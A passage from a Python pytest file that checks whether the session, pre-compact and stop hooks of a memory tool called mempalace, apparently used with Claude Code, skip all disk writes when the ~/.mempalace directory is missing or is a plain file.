        hook_stop(
            {"session_id": "absent", "transcript_path": str(transcript), "stop_hook_active": False},
            "claude-code",
        )
    assert json.loads(buf.getvalue() or "{}") == {}
    assert not fake_root.exists()


def test_hook_precompact_does_not_create_palace_dir_when_absent(tmp_path, monkeypatch):
    fake_root = _redirect_palace_root(monkeypatch, tmp_path)
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        hook_precompact(
            {"session_id": "absent", "transcript_path": str(transcript)},
            "claude-code",
        )
    assert json.loads(buf.getvalue() or "{}") == {}
    assert not fake_root.exists()


def test_hook_session_start_does_not_create_palace_dir_when_absent(tmp_path, monkeypatch):
    fake_root = _redirect_palace_root(monkeypatch, tmp_path)
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        hook_session_start({"session_id": "absent"}, "claude-code")
    assert json.loads(buf.getvalue() or "{}") == {}
    assert not fake_root.exists()


def test_log_does_not_create_palace_dir_when_absent(tmp_path, monkeypatch):
    fake_root = _redirect_palace_root(monkeypatch, tmp_path)
    _log("test message")
    assert not fake_root.exists()


def test_existing_dir_proceeds_normally(tmp_path, monkeypatch):
    """Regression: when PALACE_ROOT exists, hooks must proceed (no short-circuit)."""
    fake_root = tmp_path / "present-mempalace"
    fake_root.mkdir()
    monkeypatch.setattr(hooks_cli_mod, "PALACE_ROOT", fake_root)
    monkeypatch.setattr(hooks_cli_mod, "STATE_DIR", fake_root / "hook_state")
    monkeypatch.setattr(hooks_cli_mod, "_state_dir_initialized", False)
    _log("test message")
    # _log should have created the state dir under the existing palace root
    assert (fake_root / "hook_state").exists()
    assert (fake_root / "hook_state" / "hook.log").is_file()


def test_regular_file_at_palace_root_treated_as_absent(tmp_path, monkeypatch):
    """A regular file at ~/.mempalace must be treated the same as absent.

    ``Path.exists()`` returns True for a regular file, which would let the
    kill-switch be bypassed and crash later when ``STATE_DIR.mkdir()`` runs
    on ``NotADirectoryError``. ``_palace_root_exists()`` must use
    ``is_dir()`` so a stray file (or broken symlink) short-circuits cleanly.
    """
    fake_root = tmp_path / "file-not-dir"
    fake_root.write_text("oops, this is a file not a directory")
    monkeypatch.setattr(hooks_cli_mod, "PALACE_ROOT", fake_root)
    monkeypatch.setattr(hooks_cli_mod, "STATE_DIR", fake_root / "hook_state")
    monkeypatch.setattr(hooks_cli_mod, "_state_dir_initialized", False)

    # _palace_root_exists() is the source of truth — it must return False.
    assert hooks_cli_mod._palace_root_exists() is False

    # Hooks must short-circuit (return {} on stdout) and not touch disk.
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        hook_session_start({"session_id": "file-at-root"}, "claude-code")
    assert json.loads(buf.getvalue() or "{}") == {}

    # _log must also short-circuit — it must NOT try to mkdir a path under a
    # regular file (which would raise NotADirectoryError).
    _log("test message")  # would raise if not short-circuited

    # The stray file is left untouched; we never try to convert it.
    assert fake_root.is_file()
    assert fake_root.read_text() == "oops, this is a file not a directory"
